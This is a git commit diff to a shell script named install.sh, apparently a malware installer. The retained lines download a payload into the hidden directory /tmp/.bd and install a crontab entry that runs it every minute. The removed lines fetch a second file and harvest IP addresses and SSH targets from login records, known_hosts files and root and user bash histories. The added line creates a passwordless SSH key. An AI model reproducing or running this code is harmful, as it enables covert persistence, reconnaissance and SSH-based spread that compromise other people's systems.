9dc869ca14483323e0ad4ead25874f4539886a1d
robpot891 <rpotter@live.ca>
2019-01-27 22:09:12 -0500

    Update install.sh

--- install.sh
+++ install.sh
@@ -10,19 +10,4 @@ curl -s -o /tmp/.bd/bd.sh $urlprefix/fcUFJKm0
 chmod +x /tmp/.bd/bd.sh
 [ ! -f /tmp/.bd/crontab ] && echo '* * * * * /bin/bash /tmp/.bd/bd.sh > /dev/null 2>&1' >> /tmp/.bd/crontab
 crontab /tmp/.bd/crontab
-[ ! -f /tmp/.bd/$xr ] && curl -s -o /tmp/.bd/$xr $sshtml/$xr
-chmod +x /tmp/.bd/$xr
-
-last -a|awk '{print $10}'|sort -u|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' > .h
-cat /root/.ssh/known_hosts|grep -v ,|awk '{print $1}' >> .h
-cat /root/.ssh/known_hosts|grep ,|awk -F, '{print $1}' >> .h
-cat /root/.bash_history|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|sort -u >> .h
-cat /home/*/.ssh/known_hosts|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|sort -u >> .h
-cat /home/*/.bash_history|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|sort -u >> .h
-cat /home/*/.bash_history |grep ssh|awk '{print $2}'|grep -v '-'|grep -v / |sort -u >> .h
-cat /home/*/.bash_history |grep ssh|awk '{print $3}'|grep -v '-'|grep -v / |sort -u >> .h
-cat /root/.bash_history |grep ssh|awk '{print $2}'|grep -v '-'|grep -v /|sort -u >> .h
-cat /root/.bash_history |grep ssh|awk '{print $3}'|grep -v '-'|grep -v /|sort -u >> .h
-cat .h|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' > .hh
-cat .h|grep -v 127.0.0.1|grep -v localhost|sort -u >> .hh
-cat .hh > .h
+[ ! -f ~/.ssh/id_rsa.pub ] && ssh-keygen -t rsa -q -N '' -f ~/.ssh/id_rsa
